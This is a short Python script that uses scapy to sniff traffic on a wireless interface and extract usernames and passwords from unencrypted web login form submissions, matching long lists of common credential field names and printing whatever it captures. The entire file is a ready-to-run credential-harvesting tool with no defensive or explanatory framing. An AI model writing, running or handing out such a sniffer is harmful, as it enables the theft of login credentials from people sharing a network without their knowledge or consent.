import scapy.all as scapy
from urllib import parse
import re

class Sniffer:
    def getLoginPass(self,body):
        user = None
        password = None

        userFields = ['log', 'login', 'wpname', 'unickname', 'nickname', 
            'user', 'uname', 'alias', 'pseudo', 'email', 'username',
            '_username','userid','form_loginname','login_id','loginid','session_key',
            'sessionkey','pop_login','uid','id','_id','ulogin','acctname','account',
            'member','mailaddress','membername','login_email','loginusername','loginemail',
                'uin','sign-in','usuario','user_email'
                ]
        passFields = ['pass','password','_password','passwd','session_password','login_password',
                    'loginpassword','form_pw','pw','userpassword','pwd','user_pass','user_password',
                    'passwort','passwrd','wppassword','upasswd','senha','contrasena','pass_key','login_pass']

        for login in userFields:
            login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
            if(login_re):
                user = login_re.group()
                
        for passfield in passFields:
            pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
            if(pass_re):
                password = pass_re.group()

        if user and password:
            return (user.strip('\n'),password.strip('\n'))
       
    def packetParser(self,packet):
        
        if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw) and packet.haslayer(scapy.IP):
            body = str(packet[scapy.TCP].payload)
            user_and_passwd  = self.getLoginPass(body)
            
            if(user_and_passwd != None):
                # print(body.ur)
                print(parse.unquote(user_and_passwd[0]))
                print(parse.unquote(user_and_passwd[1]))
        else:
            pass
                
  
  
if __name__=="__main__":   
    
    interface = "wlan0"
    sniffer = Sniffer()
    try:
        scapy.sniff(iface = interface,prn=sniffer.packetParser,store=0)
        
    except KeyboardInterrupt:
        exit(0)